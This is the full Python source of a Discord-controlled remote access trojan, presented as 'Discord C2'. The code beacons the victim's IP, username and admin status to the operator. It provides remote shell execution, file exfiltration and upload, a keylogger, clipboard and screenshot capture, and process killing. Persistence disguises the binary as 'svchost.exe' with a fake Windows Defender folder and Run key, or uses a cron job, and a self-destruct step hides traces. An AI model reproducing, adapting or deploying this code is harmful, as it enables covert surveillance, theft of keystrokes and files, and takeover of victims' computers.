# Discord C2 
# @huzaifa818
# Run with: python discord_c2.py
# Requires: discord.py, pyautogui, pynput, pyperclip, psutil, pillow, opencv-python (for screenshot)

import subprocess
import sys
import os
import json
import ctypes
import platform
import io
import urllib.request
import time
import threading
import shutil
import getpass
import socket
from datetime import datetime

# ---------- Configuration ----------
BOT_TOKEN = ""      #your bot token
CHANNEL_ID =                                                            #channel id
ALLOWED_USER_IDS = []                                                     #your user id

# ---------- Imports for extended features ----------
try:
    import discord
    from discord.ext import commands
    from discord.colour import Color
    from PIL import ImageGrab
    import pyautogui
    import pyperclip
    import psutil
    from pynput import keyboard
except ImportError as e:
    print(f"Missing module: {e}. Install with: pip install discord.py pillow pyautogui pyperclip psutil pynput opencv-python")
    sys.exit(1)

# ---------- Global state for keylogger ----------
keylog_active = False
keylog_buffer = []
keylog_lock = threading.Lock()
keylog_thread = None

# ---------- Helper functions ----------
def get_system_info():
    """Collect system information for the embed."""
    info = {
        "ip": "Unknown",
        "user": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "admin": ctypes.windll.shell32.IsUserAnAdmin() if platform.system() == "Windows" else os.geteuid() == 0,
        "cwd": os.getcwd(),
        "hostname": socket.gethostname()
    }
    try:
        info["ip"] = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
    except:
        try:
            import requests
            info["ip"] = requests.get('https://api.ipify.org', timeout=5).text
        except:
            pass
    return info

def execute_cmd(cmd, shell=True, timeout=20, cwd=None):
    """Execute a shell command and return output."""
    try:
        if platform.system() == "Windows" and not cmd.startswith("powershell"):
            # Use PowerShell for consistency (optional, but for cmd fallback)
            result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout, cwd=cwd)
        else:
            result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout, cwd=cwd)
        output = result.stdout + result.stderr
        if len(output) > 3000:
            return output[:2900] + "\n[TRUNCATED]"
        return output.strip() or "[no output]"
    except subprocess.TimeoutExpired:
        return "Command timed out."
    except Exception as e:
        return f"Error: {str(e)}"

def save_long_output(command, output):
    """Save long output to a file and return filename."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"output_{timestamp}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"Command: {command}\n{'='*60}\n\n{output}")
    return filename

def simple_tree(path=".", prefix=""):
    """Generate a text tree of a directory."""
    try:
        items = sorted(os.listdir(path))
        tree = []
        for i, item in enumerate(items):
            p = "└── " if i == len(items)-1 else "├── "
            full = os.path.join(path, item)
            tree.append(prefix + p + item + ("/" if os.path.isdir(full) else ""))
            if os.path.isdir(full):
                ext = "    " if i == len(items)-1 else "│   "
                tree.append(simple_tree(full, prefix + ext))
        return "\n".join(tree) or "empty"
    except Exception as e:
        return str(e)

# ---------- Discord bot setup ----------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Store client info
client_info = get_system_info()

@bot.event
async def on_ready():
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        embed = discord.Embed(title="🟢 Discord C2 Agent Online", color=Color.green())
        embed.add_field(name="🌐 IP", value=client_info['ip'])
        embed.add_field(name="👤 User", value=client_info['user'])
        embed.add_field(name="👑 Admin", value="✅" if client_info['admin'] else "❌")
        embed.add_field(name="💻 OS", value=client_info['os'])
        embed.add_field(name="📁 CWD", value=client_info['cwd'])
        embed.add_field(name="🖥️ Hostname", value=client_info['hostname'])
        await channel.send(embed=embed)
    print(f"Logged in as {bot.user.name}")

def authorized(ctx):
    return ctx.author.id in ALLOWED_USER_IDS

# ---------- Filesystem commands ----------
@bot.command()
async def pwd(ctx):
    if not authorized(ctx): return
    await ctx.send(f"📂 `{os.getcwd()}`")

@bot.command()
async def cd(ctx, *, path: str = None):
    if not authorized(ctx): return
    try:
        if path:
            os.chdir(path)
            client_info['cwd'] = os.getcwd()
            await ctx.send(f"📁 Changed to `{os.getcwd()}`")
        else:
            await ctx.send(f"📁 Current directory: `{os.getcwd()}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command()
async def ls(ctx, *, path: str = "."):
    if not authorized(ctx): return
    try:
        items = []
        for entry in sorted(os.listdir(path)):
            full = os.path.join(path, entry)
            item_type = "📁" if os.path.isdir(full) else "📄"
            size = f" ({os.path.getsize(full):,}b)" if os.path.isfile(full) else ""
            items.append(f"{item_type} {entry}{size}")
        output = "\n".join(items) or "empty"
        if len(output) > 1900:
            filename = save_long_output(f"ls {path}", output)
            await ctx.send(f"📂 Contents of `{path}` (long)", file=discord.File(filename))
            os.remove(filename)
        else:
            await ctx.send(f"📂 **`{path}`**\n```{output}```")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command()
async def tree(ctx, *, path: str = "."):
    if not authorized(ctx): return
    result = simple_tree(path)
    if len(result) > 1900:
        filename = save_long_output(f"tree {path}", result)
        await ctx.send(f"🌳 Tree of `{path}`", file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(f"🌳 **`{path}`**\n```{result}```")

@bot.command()
async def rm(ctx, *, path: str):
    if not authorized(ctx): return
    try:
        if not os.path.exists(path):
            await ctx.send(f"❌ Not found: {path}")
            return
        if os.path.isdir(path):
            await ctx.send("❌ Use `!rmdir` for directories")
            return
        os.remove(path)
        await ctx.send(f"✅ Deleted file: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command()
async def rmdir(ctx, *, path: str):
    if not authorized(ctx): return
    try:
        shutil.rmtree(path, ignore_errors=True)
        await ctx.send(f"✅ Removed directory: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

# ---------- File transfer ----------
@bot.command()
async def download(ctx, *, path: str):
    """Download a file from the victim machine to Discord."""
    if not authorized(ctx): return
    if not os.path.isfile(path):
        await ctx.send(f"❌ Not a file or not found: `{path}`")
        return
    size = os.path.getsize(path)
    if size > 8_000_000:  # Discord limit ~8MB
        await ctx.send(f"⚠️ File too large ({size:,} bytes). Use alternative exfil.")
        return
    try:
        await ctx.send(file=discord.File(path))
    except Exception as e:
        await ctx.send(f"❌ Download failed: {e}")

@bot.command()
async def upload(ctx):
    """Upload a file to the victim machine (attach file to command)."""
    if not authorized(ctx): return
    if not ctx.message.attachments:
        await ctx.send("❌ Attach a file with the command")
        return
    att = ctx.message.attachments[0]
    save_path = att.filename
    # optional: caption can specify custom path
    if ctx.message.content.strip() != "!upload":
        parts = ctx.message.content.split(maxsplit=1)
        if len(parts) > 1:
            save_path = parts[1].strip()
    try:
        data = await att.read()
        os.makedirs(os.path.dirname(save_path) or '.', exist_ok=True)
        with open(save_path, 'wb') as f:
            f.write(data)
        await ctx.send(f"✅ Uploaded to `{save_path}` ({len(data):,} bytes)")
    except Exception as e:
        await ctx.send(f"❌ Upload failed: {e}")

# ---------- Persistence ----------
@bot.command()
async def persist(ctx):
    if not authorized(ctx): return
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        sys_name = platform.system()
        if sys_name == "Windows":
            dest_dir = os.path.join(os.getenv('APPDATA'), "WindowsDefender")
            os.makedirs(dest_dir, exist_ok=True)
            dest = os.path.join(dest_dir, "svchost.exe")
            shutil.copy2(exe_path, dest)
            # Registry
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Windows Security Health", 0, winreg.REG_SZ, dest)
            winreg.CloseKey(key)
            # Startup folder
            startup = os.path.join(os.getenv('APPDATA'),
                                 r"Microsoft\Windows\Start Menu\Programs\Startup")
            shutil.copy2(exe_path, os.path.join(startup, "WindowsUpdate.lnk"))
            await ctx.send(f"✅ Persistence installed: HKCU\\Run + Startup folder\n📍 {dest}")
        elif sys_name in ["Linux", "Darwin"]:
            cron_line = f"@reboot nohup '{exe_path}' >/dev/null 2>&1 &"
            cmd = f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -'
            subprocess.run(cmd, shell=True, capture_output=True)
            await ctx.send("✅ Persistence added via @reboot cron")
        else:
            await ctx.send("❌ Persistence not implemented for this OS")
    except Exception as e:
        await ctx.send(f"❌ Persistence failed: {e}")

# ---------- Keylogger ----------
def on_press(key):
    global keylog_buffer
    try:
        with keylog_lock:
            keylog_buffer.append(str(key))
    except:
        pass

@bot.command()
async def keylog_start(ctx):
    global keylog_active, keylog_thread
    if not authorized(ctx): return
    if keylog_active:
        await ctx.send("⚠️ Keylogger already running.")
        return
    keylog_active = True
    keylog_buffer.clear()
    listener = keyboard.Listener(on_press=on_press)
    keylog_thread = threading.Thread(target=listener.start, daemon=True)
    keylog_thread.start()
    await ctx.send("✅ Keylogger started.")

@bot.command()
async def keylog_stop(ctx):
    global keylog_active
    if not authorized(ctx): return
    if not keylog_active:
        await ctx.send("⚠️ Keylogger not running.")
        return
    keylog_active = False
    await ctx.send("✅ Keylogger stopped.")

@bot.command()
async def keylog_dump(ctx):
    global keylog_active, keylog_buffer
    if not authorized(ctx): return
    with keylog_lock:
        data = "".join(keylog_buffer)
        keylog_buffer.clear()
    if not data:
        await ctx.send("📝 No keystrokes captured yet.")
        return
    if len(data) > 1900:
        filename = save_long_output("keylog_dump", data)
        await ctx.send("📝 Keylog dump (long)", file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(f"📝 Keylog:\n```{data}```")

# ---------- Clipboard ----------
@bot.command()
async def clip(ctx):
    if not authorized(ctx): return
    try:
        content = pyperclip.paste()
        if len(content) > 1900:
            content = content[:1900] + "\n...(truncated)"
        await ctx.send(f"📋 Clipboard:\n```{content or '[empty]'}```")
    except Exception as e:
        await ctx.send(f"❌ Clipboard error: {e}")

# ---------- Screenshot ----------
@bot.command()
async def screenshot(ctx):
    if not authorized(ctx): return
    try:
        img = pyautogui.screenshot()
        bio = io.BytesIO()
        img.save(bio, 'PNG')
        bio.seek(0)
        await ctx.send("📸 Screenshot", file=discord.File(bio, f"screenshot_{datetime.now().strftime('%H%M%S')}.png"))
    except Exception as e:
        await ctx.send(f"❌ Screenshot failed: {e}")

# ---------- Process control ----------
@bot.command()
async def ps(ctx):
    if not authorized(ctx): return
    lines = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            lines.append(f"{proc.info['pid']:6} | {proc.info['name'][:28]:28} | {proc.info['username'] or '?'}")
        except:
            pass
    output = "\n".join(lines[:60])
    if len(output) > 1900:
        filename = save_long_output("ps", output)
        await ctx.send("📊 Process list (long)", file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(f"📊 Processes:\n```{output}```")

@bot.command()
async def kill(ctx, *, target: str):
    if not authorized(ctx): return
    try:
        if target.isdigit():
            p = psutil.Process(int(target))
            p.terminate()
            await ctx.send(f"✅ Terminated PID {target}")
        else:
            found = False
            for proc in psutil.process_iter(['pid', 'name']):
                if target.lower() in proc.info['name'].lower():
                    proc.terminate()
                    await ctx.send(f"✅ Killed {proc.info['name']} (PID {proc.info['pid']})")
                    found = True
                    break
            if not found:
                await ctx.send(f"❌ Process not found: {target}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

# ---------- System info (detailed) ----------
@bot.command()
async def sysinfo(ctx):
    if not authorized(ctx): return
    info = get_system_info()
    embed = discord.Embed(title="🖥️ System Information", color=Color.blue())
    embed.add_field(name="OS", value=info['os'], inline=True)
    embed.add_field(name="Hostname", value=info['hostname'], inline=True)
    embed.add_field(name="User", value=info['user'], inline=True)
    embed.add_field(name="Admin", value="✅" if info['admin'] else "❌", inline=True)
    embed.add_field(name="IP", value=info['ip'], inline=True)
    embed.add_field(name="Current Directory", value=info['cwd'], inline=False)
    await ctx.send(embed=embed)

# ---------- Self destruct ----------
@bot.command()
async def self_destruct(ctx):
    if not authorized(ctx): return
    await ctx.send("💣 Self‑destruct sequence initiated. Deleting executable in 3 seconds.")
    time.sleep(3)
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if platform.system() == "Windows":
            subprocess.run(f'ping 127.0.0.1 -n 4 > nul & del /f /q "{exe_path}"', shell=True)
        else:
            subprocess.run(f'sleep 4 && rm -f "{exe_path}"', shell=True)
    except:
        pass
    sys.exit(0)

# ---------- Raw shell command execution (fallback) ----------
@bot.command()
async def shell(ctx, *, command: str = None):
    if not authorized(ctx): return
    if not command:
        await ctx.send("❌ Usage: `!shell whoami /all`")
        return
    output = execute_cmd(command, cwd=os.getcwd())
    if len(output) > 1900:
        filename = save_long_output(command, output)
        await ctx.send(f"💻 `{command}` (long output)", file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send(f"💻 `{command}`\n```{output}```")

# ---------- Help command ----------
@bot.command(name='commands')   # renamed to avoid conflict
async def show_commands(ctx):
    if not authorized(ctx): return
    help_text = """
**Discord C2 Commands (@Huzaifa818)**  

**Filesystem**  
`!pwd` – Show current directory  
`!cd <path>` – Change directory  
`!ls [path]` – List directory contents  
`!tree [path]` – Directory tree  
`!rm <file>` – Delete file  
`!rmdir <dir>` – Delete directory  

**File Transfer**  
`!download <path>` – Download file from victim  
`!upload` – Attach file to upload to victim  

**Persistence**  
`!persist` – Install startup persistence  

**Keylogger**  
`!keylog_start` – Start keylogger  
`!keylog_stop` – Stop  
`!keylog_dump` – Retrieve keystrokes  

**Clipboard**  
`!clip` – Get current clipboard text  

**Screenshot**  
`!screenshot` – Capture screen  

**Processes**  
`!ps` – List processes  
`!kill <pid|name>` – Terminate process  

**System**  
`!sysinfo` – Show system information  

**Self‑destruct**  
`!self_destruct` – Delete executable  

**Raw command**  
`!shell <command>` – Execute any shell command  

**Utility**  
`!ping` – Check latency  
"""
    await ctx.send(f"```{help_text}```")
@bot.command()
async def ping(ctx):
    if not authorized(ctx): return
    await ctx.send(f"🏓 Pong! Latency: {round(bot.latency*1000)}ms | Admin: {'✅' if client_info['admin'] else '❌'}")

# ---------- Run bot ----------
if __name__ == "__main__":
    bot.run(BOT_TOKEN)